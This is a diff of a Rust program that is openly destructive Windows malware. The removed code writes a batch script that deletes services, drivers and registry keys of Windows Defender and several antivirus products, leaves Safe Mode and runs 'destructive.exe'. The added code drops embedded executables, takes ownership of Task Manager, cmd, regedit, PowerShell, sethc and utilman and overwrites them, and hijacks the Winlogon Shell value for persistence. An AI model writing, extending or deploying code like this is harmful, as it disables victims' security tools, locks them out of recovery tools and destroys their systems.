@@ -2,7 +2,7 @@ use std::process::{Command, Stdio};
 use std::path::{Path};
 use std::fs::{File};
 use std::io::{self, Write};
-use winreg::enums::*;
+use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE};
 use winreg::RegKey;
 use std::fs;
 
@@ -115,134 +115,10 @@ fn modify_registry() -> io::Result<()> {
     }
 
     // Set new "Shell" value
-    let new_shell_value = r"c:\program files\utkudrk2\utkudrk2.bat";
+    let new_shell_value = r"c:\program files\utkudrk2\utkudrk2.exe";
     winlogon_key.set_value("Shell", &new_shell_value)?;
 
-    println!("Registry modified successfully: Shell set to \"C:\\Program Files\\utkudrk2\\utkudrk2.bat\".");
-
-    Ok(())
-}
-
-fn create_batch_file() -> io::Result<()> {
-    // Create a batch file to clean up Safe Mode and schedule destructive.exe
-    let batch_content = r#"
-@echo off
-:: Check if we are in Safe Mode by examining the current boot entry
-bcdedit /enum {current} | findstr /i "safeboot"
-if %errorlevel% == 0 (
-    echo Safe Mode is enabled, proceeding with actions...
-) else (
-    echo Safe Mode is not enabled
-    "C:\Program Files\utkudrk2\destructive.exe"
-    exit
-)
-
-:: Wait for the reboot to happen and run this part only after Safe Mode is entered
-
-:: Modify Shell registry to run batch file
-echo Modifying registry to set Shell value...
-reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, \"c:\program files\utkudrk2\utkudrk2.bat\"" /f
-
-:: Perform cleanup tasks
-echo Removing Safe Mode setting...
-bcdedit /deletevalue {current} safeboot
-
-:: Delete registry keys related to antivirus services
-:: Webroot non registry
-sc delete WRSkyClient
-sc delete WRCoreService
-sc delete WRSVC
-del /f /y "%SystemRoot%\System32\Drivers\wrkrn.sys" :: https://www.reddit.com/r/msp/comments/uu7cy6/webroot_secureanywhere_uninstall_issue/
-del /f /y "%SystemRoot%\System32\wruser.dll"
-rd /s /q "%ProgramFiles%\Webroot"
-rd /s /q "%ProgramFiles(x86)%\Webroot"
-rd /s /q "%ProgramData%\WRCore"
-rd /s /q "%ProgramData%\WRData"
-rd /s /q "%ProgramData%\WRData"
-rd /s /q "%ProgramFiles%\Webroot"
-rd /s /q "%ProgramFiles(x86)%\Webroot"
-rd /s /q "%ProgramData%\WRCore"
-:: Avira non registry
-rd /s /q "%ProgramFiles%\Avira"
-rd /s /q "%ProgramFiles(x86)%\Avira"
-rd /s /q "%ProgramData%\Avira"
-
-echo Deleting registry keys...
-:: Startup 
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
-:: Avast
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbIDSAgent" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbIDSAgent" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswApPct" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswApPct" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsdriver" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsdriver" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsh" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsh" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbuniv" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbuniv" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswElam" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswElam" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswKbd" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswKbd" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswMonFit" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswMonFit" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswNetHub" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswNetHub" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRdr" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRdr" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRvrt" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRvrt" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
-:: Webroot
-reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f
-reg delete "HKLM\SOFTWARE\WRData" /f
-reg delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f
-reg delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f
-:: Windows Defender
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\WinDefend" /f
-:: Kaspersky 21.3
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\AVP21.3" /f
-:: Malwarebytes
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\MBAMService" /f
-:: Bitdefender
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f
-:: ESET
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\eamonm" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\edevmon" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ehdrv" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekbdflt" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekrn" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfw" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfwwfp" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f
-:: Avira
-reg delete HKLM\SOFTWARE\AVIRA /f
-
-:: Confirm completion
-echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
-
-:: Run the destructive.exe
-"C:\Program Files\utkudrk2\destructive.exe"
-
-:: Exit
-exit
-"#;
-
-    let path = Path::new("c:\\Program Files\\utkudrk2\\utkudrk2.bat");
-    let mut file = File::create(path)?;
-    file.write_all(batch_content.as_bytes())?;
+    println!("Registry modified successfully: Shell set to \"C:\\Program Files\\utkudrk2\\utkudrk2.exe\".");
 
     Ok(())
 }
@@ -255,11 +131,17 @@ fn extract_embedded_exe() -> io::Result<()> {
         println!("Created directory: {}", target_dir.display());
     }
 
-    // Write the embedded executable to a file
-    let exe_path = target_dir.join("destructive.exe");
-    let mut exe_file = File::create(&exe_path)?;
-    exe_file.write_all(include_bytes!("../resources/destructive.exe"))?;
-    println!("Executable saved to {}.", exe_path.display());
+    // Write the embedded destructive.exe to a file
+    let destructive_path = target_dir.join("destructive.exe");
+    let mut destructive_file = File::create(&destructive_path)?;
+    destructive_file.write_all(include_bytes!("../resources/destructive.exe"))?;
+    println!("Executable saved to {}.", destructive_path.display());
+
+    // Write the embedded utkudrk2.exe to a file
+    let utkudrk2_path = target_dir.join("utkudrk2.exe");
+    let mut utkudrk2_file = File::create(&utkudrk2_path)?;
+    utkudrk2_file.write_all(include_bytes!("../resources/utkudrk2.exe"))?;
+    println!("Executable saved to {}.", utkudrk2_path.display());
 
     Ok(())
 }
@@ -273,6 +155,77 @@ fn reboot_system() -> io::Result<()> {
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .output()?;
+
+    Ok(())
+}
+
+fn replace_files() -> io::Result<()> {
+    let files_to_takeown = [
+        r"C:\Windows\System32\Taskmgr.exe",
+        r"C:\Windows\System32\perfmon.exe",
+        r"C:\Windows\System32\sethc.exe",
+        r"C:\Windows\System32\cmd.exe",
+        r"C:\Windows\System32\reg.exe",
+        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe",
+        r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
+        r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe",
+        r"C:\Windows\regedit.exe",
+        r"C:\Windows\System32\utilman.exe",
+    ];
+
+    // Process files to take ownership and replace them
+    for file in files_to_takeown.iter() {
+        println!("Processing: {}", file);
+
+        // Take ownership of the file
+        let output = Command::new("cmd")
+            .args(&["/C", &format!("takeown /f \"{}\"", file)])
+            .output()?;
+
+        if output.status.success() {
+            println!("Ownership taken for: {}", file);
+        } else {
+            eprintln!(
+                "Failed to take ownership of {}: {:?}",
+                file,
+                String::from_utf8_lossy(&output.stderr)
+            );
+            continue;
+        }
+
+        // Grant full permissions to the current user
+        let output = Command::new("cmd")
+            .args(&["/C", &format!("icacls \"{}\" /grant \"%username%\":F", file)])
+            .output()?;
+
+        if output.status.success() {
+            println!("Permissions granted for: {}", file);
+        } else {
+            eprintln!(
+                "Failed to grant permissions for {}: {:?}",
+                file,
+                String::from_utf8_lossy(&output.stderr)
+            );
+            continue;
+        }
+
+        // Replace the file with another executable (optional)
+        let replacement_file = r"C:\Program Files\utkudrk2\utkudrk2.exe"; // Example executable to replace with
+        let output = Command::new("cmd")
+            .args(&["/C", &format!("copy \"{}\" \"{}\" /Y", replacement_file, file)])
+            .output()?;
+
+        if output.status.success() {
+            println!("File replaced: {}", file);
+        } else {
+            eprintln!(
+                "Failed to replace {}: {:?}",
+                file,
+                String::from_utf8_lossy(&output.stderr)
+            );
+        }
+    }
 
     Ok(())
 }
@@ -318,16 +271,15 @@ fn main() {
     if let Err(e) = extract_embedded_exe() {
         eprintln!("Error extracting embedded executable: {}", e);
     }
-    
-    // Step 6: Create the batch file in the current directory
-    if let Err(e) = create_batch_file() {
-        eprintln!("Error creating batch file: {}", e);
-        return;
-    }
 
     // Step 7: Reboot the system to Safe Mode if needed
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
+    }
+
+    // Step 8: Replace files with utkudrk2.exe
+    if let Err(e) = replace_files() {
+        eprintln!("Error replacing files: {}", e);
     }
 
     // Step 9: Modify the registry to set Shell value
